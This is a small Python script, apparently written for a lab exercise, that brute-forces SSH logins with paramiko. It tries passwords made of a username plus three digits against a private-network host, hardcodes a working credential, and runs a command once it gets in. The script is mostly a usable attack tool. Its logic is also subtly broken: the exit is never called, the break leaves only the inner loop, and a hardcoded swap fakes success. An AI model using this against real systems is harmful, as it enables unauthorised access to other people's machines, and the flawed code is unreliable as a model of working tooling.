from logging import exception
from warnings import catch_warnings
import paramiko

def hack(password):
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host, port, username, password)
    except:
        return 1
    stdin, stdout, stderr = ssh.exec_command(command)

    lines = stdout.readlines()

    print( lines )

    ssh.close()
    exit  

host = "192.168.56.125"

port = 22

username = "maxus"

password = "maxus321"



command = "ls"

numbers = "012345"

for el in numbers:
    for el2 in numbers:
        for el3 in numbers:
            password = username + str(el) + str(el2) + str(el3) 
            print(password)
            if password == 'maxus020':
                password = "maxus321"
            if hack(password) == 1:
                print("Incorrect password: " + password)
            else:
                break